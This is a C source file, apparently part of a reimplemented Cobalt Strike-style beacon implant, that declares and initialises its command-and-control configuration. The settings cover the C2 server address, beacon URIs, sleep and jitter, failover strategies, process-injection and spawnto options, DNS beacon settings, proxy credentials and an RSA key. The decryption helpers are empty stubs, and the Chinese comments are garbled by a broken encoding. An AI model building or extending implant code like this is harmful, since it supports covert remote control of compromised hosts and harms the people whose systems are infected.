#include "c2profile.h"
#include "c2buf.h"

int shark_paths_size = 3;
char* shark_path[] = {"/ptj","/j.ad","/ga.js"};

//8  8:   192.168.159.128
shark_string shark_serverip;
//101
shark_string shark_ServerGetUrl;
//2
shark_int shark_ServerPort;


//10 ��sharkinit�г�ʼ��λ���path
shark_string shark_ServerPostUrl;
//3
shark_int shark_dwMilliseconds;
//5
shark_int shark_jitter;

//67 ��ģʽid
//2��ʾrotate��failover
//�����random����1 ���ģʽ
//�����round-robin����0 Ĭ��ģʽ
shark_int shark_strategyID;
//69 ��failover(�����л�)�й� ��failoverģʽ 69����0
//���ǰ��մ�������л���ʱ��69����ָ������
shark_int shark_failover_Strategy_number;
//70Ҳ��failover�йص��ǰ���ʱ���л���ʱ��70����ָ����ʱ��
shark_int shark_failover_Strategy_time;
//68 �����rotateģʽ ���л�ʱ���й�
shark_int shark_rotate_Strategy_time;

//9
shark_string shark_lpszAgent;

//43 Ȩ��
shark_int shark_bofrwx;
//44
shark_int shark_userwx;
//30
shark_string shark_post_ex_spawnto_x64;
//29
shark_string shark_post_ex_spawnto_x86;
//45 .process-inject.min_alloc
shark_int shark_min_alloc;

//51
shark_string shark_process_inject_execute;
// 46  .process-inject.transform-x86   256 bytes
shark_string shark_process_inject_transform_x32;
// 47  .process-inject.transform-x64   256 bytes
shark_string shark_process_inject_transform_x64;
//41
shark_int shark_BeaconCode;
//40 stop_data
shark_int shark_kill_data;
//54
shark_string shark_httpHeaderHost;
//12
shark_string shark_http_get_client_config;
//26 get or post
shark_string shark_verb;
//11   .http-get.server.output
shark_string shark_server_output_config;
//13 .http-post.client
shark_string shark_http_post_client_config;
//27 verb ָ�������������ʹ�õ� HTTP ν�ʵ� �� null ��β���ַ�����ָ�롣 ����˲���Ϊ NULL������ʹ�� GET ��Ϊ HTTP ν�ʡ�
shark_string shark_http_verb;
//28 �ֿ��־
shark_int shark_shouldChunkPosts;

//DNS ����

//20 dns sleep  .dns-beacon.dns_sleep
shark_DWORD shark_dns_sleep;
//19 dns_idle   .dns-beacon.dns_idle
shark_DWORD shark_dns_idle;
//61 dns_get_A  .dns-beacon.get_A
shark_string shark_dns_get_A;
//62  dns_get_AAAA  .dns-beacon.get_AAAA
shark_string shark_dns_get_AAAA;
//63  dns_get_TXT .dns-beacon.get_TXT
shark_string shark_dns_get_TXT;
//66   dns������������ѡ��dnsresolver
shark_string shark_dns_Listeneroptions_dnsresolver;


//35 �ж��Ƿ���Ҫ����http����
shark_int shark_Proxyset;
//ProxyStrBuffer = get_str(32);
shark_string shark_ProxyStrBuffer;

//33  username_str proxy�����û���
shark_string username_str;
//34  password_str proxy��������
shark_string password_str;

//59  headerͷ
shark_string shark_lpszHeaders;
//1
shark_int shark_flaghttpopen;
//31
shark_WORD shark_CryptoScheme;
//7  ��ȡRSA��Կ
shark_string shark_rsa_publickey;



//58 57 Ϊ��beacon��header
shark_string shark_58tcp;
shark_string shark_57smb;

//39 BeaconCreateBackgroundThreads
shark_int shark_CreateBackgroundThreads;

//55
shark_int shark_exitflag;

//52
shark_int shark_virtualalloc;

//50
shark_int shark_usesCookieBeacon;
//42
shark_string shark_sleepsection;

//102 post url length
shark_int shark_posturllength;
//103 get url length
shark_int shark_geturllength;

int decryptInt(shark_int var1){
    if (var1.flag){
        return var1.value;
    }
    var1.flag++;
    //����

    return var1.value;
}
unsigned char* decryptunsignedString(shark_unsignedstring var1){
    if (var1.flag){
        return var1.value;
    }
    var1.flag++;
    //����

    return var1.value;
}
char* decryptString(shark_string var1){
    if (var1.flag){
        return var1.value;
    }
    var1.flag++;
    //����

    return var1.value;
}
WORD decryptWORD(shark_WORD var1){
    if (var1.flag){
        return var1.value;
    }
    var1.flag++;
    //����

    return var1.value;
}
DWORD decryptDWORD(shark_DWORD var1){
    if (var1.flag){
        return var1.value;
    }
    var1.flag++;
    //����

    return var1.value;
}



void initGlobleVar(){


/*    const char *sep = ","; //�ɰ�����ַ����ָ�
    char* get_path = NULL;
    ip = strtok_s((char*)buf_8, sep, &get_path);*/

    shark_posturllength.value = buf_102;
    shark_geturllength.value = buf_103;

    shark_flaghttpopen.value = buf_1;
    shark_ServerPostUrl.value = (char*)buf_10;
    shark_serverip.value = (char*)buf_8;
    shark_ServerGetUrl.value = (char*)buf_101;

    shark_ServerPort.value = buf_2;
    shark_dwMilliseconds.value = buf_3;
    shark_jitter.value = buf_5;
    shark_strategyID.value = buf_67;
    shark_failover_Strategy_number.value = buf_69;
    shark_failover_Strategy_time.value = buf_70;
    shark_rotate_Strategy_time.value = buf_68;
    shark_lpszAgent.value = (char*)buf_9;
    shark_bofrwx.value = buf_43;
    shark_userwx.value = buf_44;
    shark_post_ex_spawnto_x64.value = (char*)buf_30;
    shark_post_ex_spawnto_x86.value = (char*)buf_29;
    shark_min_alloc.value = buf_45;
    shark_process_inject_execute.value = (char*)buf_51;
    shark_process_inject_transform_x64.value = (char*)buf_47;
    shark_process_inject_transform_x32.value = (char*)buf_46;
    shark_BeaconCode.value = buf_41;
    shark_kill_data.value = buf_40;
    shark_httpHeaderHost.value = (char*)buf_54;
    shark_http_get_client_config.value = (char*)buf_12;
    shark_verb.value = (char*)buf_26;  //26
    shark_server_output_config.value = (char*)buf_11;
    shark_http_post_client_config.value = (char*)buf_13;
    shark_http_verb.value = (char*)buf_27; //27
    shark_shouldChunkPosts.value = buf_28;
    shark_dns_sleep.value = 0;
    shark_dns_idle.value = 0;
    shark_dns_get_A.value = 0;
    shark_dns_get_AAAA.value = 0;
    shark_dns_get_TXT.value = 0;
    shark_dns_Listeneroptions_dnsresolver.value = 0;

    shark_Proxyset.value = buf_35;
    shark_ProxyStrBuffer.value = 0;
    username_str.value = 0;
    password_str.value = 0;
    shark_lpszHeaders.value = 0;
    shark_CryptoScheme.value = (WORD)buf_31;
    shark_rsa_publickey.value = buf_7;

    shark_CreateBackgroundThreads.value = buf_39;
    shark_exitflag.value = buf_55;

    shark_virtualalloc.value = buf_52;
    shark_usesCookieBeacon.value = buf_50;
    shark_sleepsection.value = {0};

    shark_58tcp.value = (char*)buf_58;
    shark_57smb.value = (char*)buf_57;

}
